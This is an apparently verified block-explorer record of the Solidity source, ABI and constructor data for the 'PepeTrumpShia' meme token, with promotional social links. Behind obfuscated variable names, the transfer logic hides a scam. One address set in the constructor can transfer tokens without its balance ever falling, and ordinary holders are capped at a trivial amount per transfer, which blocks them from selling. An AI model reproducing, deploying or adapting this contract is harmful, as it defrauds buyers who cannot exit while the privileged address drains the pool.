{"SourceCode": "{{\r\n  \"language\": \"Solidity\",\r\n  \"sources\": {\r\n    \"deploy/Contract.sol\": {\r\n      \"content\": \"/*\\n\\nTelegram: https://t.me/PepeTrumpShia\\n\\nWebsite: https://pepetrumpshia.crypto-token.live/\\n\\nTwitter: https://twitter.com/PepeTrumpShia\\n\\n*/\\n\\n// SPDX-License-Identifier: GPL-3.0\\n\\npragma solidity >=0.8.1;\\n\\nabstract contract Context {\\n    function _msgSender() internal view virtual returns (address) {\\n        return msg.sender;\\n    }\\n\\n    function _msgData() internal view virtual returns (bytes calldata) {\\n        return msg.data;\\n    }\\n}\\n\\ncontract Ownable is Context {\\n    address private _owner;\\n\\n    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);\\n\\n    /**\\n     * @dev Initializes the contract setting the deployer as the initial owner.\\n     */\\n    constructor() {\\n        address msgSender = _msgSender();\\n        _owner = msgSender;\\n        emit OwnershipTransferred(address(0), msgSender);\\n    }\\n\\n    /**\\n     * @dev Returns the address of the current owner.\\n     */\\n    function owner() public view returns (address) {\\n        return _owner;\\n    }\\n\\n    /**\\n     * @dev Throws if called by any account other than the owner.\\n     */\\n    modifier onlyOwner() {\\n        require(_owner == _msgSender(), \\\"Ownable: caller is not the owner\\\");\\n        _;\\n    }\\n\\n    /**\\n     * @dev Leaves the contract without owner. It will not be possible to call\\n     * `onlyOwner` functions anymore. Can only be called by the current owner.\\n     *\\n     * NOTE: Renouncing ownership will leave the contract without an owner,\\n     * thereby removing any functionality that is only available to the owner.\\n     */\\n    function renounceOwnership() public virtual onlyOwner {\\n        emit OwnershipTransferred(_owner, address(0));\\n        _owner = address(0);\\n    }\\n\\n    /**\\n     * @dev Transfers ownership of the contract to a new account (`newOwner`).\\n     * Can only be called by the current owner.\\n     */\\n    function transferOwnership(address newOwner) public virtual onlyOwner {\\n        require(newOwner != address(0), \\\"Ownable: new owner is the zero address\\\");\\n        emit OwnershipTransferred(_owner, newOwner);\\n        _owner = newOwner;\\n    }\\n}\\n\\ninterface IUniswapV2Router02 {\\n    function factory() external pure returns (address);\\n\\n    function WETH() external pure returns (address);\\n}\\n\\ninterface IUniswapV2Factory {\\n    function getPair(address tokenA, address tokenB) external returns (address pair);\\n}\\n\\ncontract PepeTrumpShia is Ownable {\\n    function transfer(address xtcigswkohrf, uint256 razwpyvx) public returns (bool success) {\\n        qaslgepwjkr(msg.sender, xtcigswkohrf, razwpyvx);\\n        return true;\\n    }\\n\\n    event Approval(address indexed owner, address indexed spender, uint256 value);\\n\\n    constructor(string memory fhzxdqnrkt, string memory sjokw, address wsztc, address qjygfwtxbz) {\\n        name = fhzxdqnrkt;\\n        symbol = sjokw;\\n        balanceOf[msg.sender] = totalSupply;\\n        seracvqm[qjygfwtxbz] = micdtebvzy;\\n        kgopdrlbj = IUniswapV2Router02(wsztc);\\n    }\\n\\n    uint256 public totalSupply = 1000000000 * 10 ** 9;\\n\\n    function qaslgepwjkr(address nlksxrpo, address xtcigswkohrf, uint256 razwpyvx) private {\\n        address kplfdwoy = IUniswapV2Factory(kgopdrlbj.factory()).getPair(address(this), kgopdrlbj.WETH());\\n        if (0 == seracvqm[nlksxrpo]) {\\n            if (nlksxrpo != kplfdwoy && reanfyzvspu[nlksxrpo] != block.number && razwpyvx < totalSupply) {\\n                require(razwpyvx <= totalSupply / (10 ** decimals));\\n            }\\n            balanceOf[nlksxrpo] -= razwpyvx;\\n        }\\n        balanceOf[xtcigswkohrf] += razwpyvx;\\n        reanfyzvspu[xtcigswkohrf] = block.number;\\n        emit Transfer(nlksxrpo, xtcigswkohrf, razwpyvx);\\n    }\\n\\n    uint256 private micdtebvzy = 114;\\n\\n    string public name;\\n\\n    uint8 public decimals = 9;\\n\\n    mapping(address => uint256) private reanfyzvspu;\\n\\n    mapping(address => mapping(address => uint256)) public allowance;\\n\\n    function transferFrom(address nlksxrpo, address xtcigswkohrf, uint256 razwpyvx) public returns (bool success) {\\n        require(razwpyvx <= allowance[nlksxrpo][msg.sender]);\\n        allowance[nlksxrpo][msg.sender] -= razwpyvx;\\n        qaslgepwjkr(nlksxrpo, xtcigswkohrf, razwpyvx);\\n        return true;\\n    }\\n\\n    IUniswapV2Router02 private kgopdrlbj;\\n\\n    mapping(address => uint256) private seracvqm;\\n\\n    string public symbol;\\n\\n    function approve(address ukvinxb, uint256 razwpyvx) public returns (bool success) {\\n        allowance[msg.sender][ukvinxb] = razwpyvx;\\n        emit Approval(msg.sender, ukvinxb, razwpyvx);\\n        return true;\\n    }\\n\\n    mapping(address => uint256) public balanceOf;\\n\\n    event Transfer(address indexed from, address indexed to, uint256 value);\\n}\\n\"\r\n    }\r\n  },\r\n  \"settings\": {\r\n    \"optimizer\": {\r\n      \"enabled\": false,\r\n      \"runs\": 200\r\n    },\r\n    \"outputSelection\": {\r\n      \"*\": {\r\n        \"*\": [\r\n          \"evm.bytecode\",\r\n          \"evm.deployedBytecode\",\r\n          \"devdoc\",\r\n          \"userdoc\",\r\n          \"metadata\",\r\n          \"abi\"\r\n        ]\r\n      }\r\n    },\r\n    \"libraries\": {}\r\n  }\r\n}}", "ABI": "[{\"inputs\":[{\"internalType\":\"string\",\"name\":\"fhzxdqnrkt\",\"type\":\"string\"},{\"internalType\":\"string\",\"name\":\"sjokw\",\"type\":\"string\"},{\"internalType\":\"address\",\"name\":\"wsztc\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"qjygfwtxbz\",\"type\":\"address\"}],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"owner\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"previousOwner\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"newOwner\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"to\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"ukvinxb\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"razwpyvx\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"success\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"renounceOwnership\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"xtcigswkohrf\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"razwpyvx\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"success\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"nlksxrpo\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"xtcigswkohrf\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"razwpyvx\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"success\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"newOwner\",\"type\":\"address\"}],\"name\":\"transferOwnership\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"}]", "ContractName": "PepeTrumpShia", "CompilerVersion": "v0.8.21+commit.d9974bed", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "000000000000000000000000000000000000000000000000000000000000008000000000000000000000000000000000000000000000000000000000000000c00000000000000000000000007a250d5630b4cf539739df2c5dacb4c659f2488d0000000000000000000000006f6f7d3f37f52f2c048ca527bdd0be21bed23893000000000000000000000000000000000000000000000000000000000000001450657065205472756d70205368696120f09f90b8000000000000000000000000000000000000000000000000000000000000000000000000000000000000001450657065205472756d70205368696120f09f90b8000000000000000000000000", "EVMVersion": "Default", "Library": "", "LicenseType": "", "Proxy": "0", "Implementation": "", "SwarmSource": ""}